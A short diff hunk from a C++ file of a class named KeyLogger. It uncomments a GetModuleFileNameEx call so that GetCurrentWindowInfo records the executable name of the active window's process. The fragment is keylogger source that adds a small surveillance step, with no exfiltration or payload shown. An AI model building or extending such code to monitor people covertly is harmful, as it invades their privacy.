@@ -229,7 +229,7 @@ std::u16string KeyLogger::GetCurrentWindowInfo()
 
 		if (processHandle != NULL) 
 		{
-			//GetModuleFileNameEx(processHandle, NULL, processName, MAX_PATH);
+			GetModuleFileNameEx(processHandle, NULL, processName, MAX_PATH);
 			CloseHandle(processHandle);
 		}
 		else 
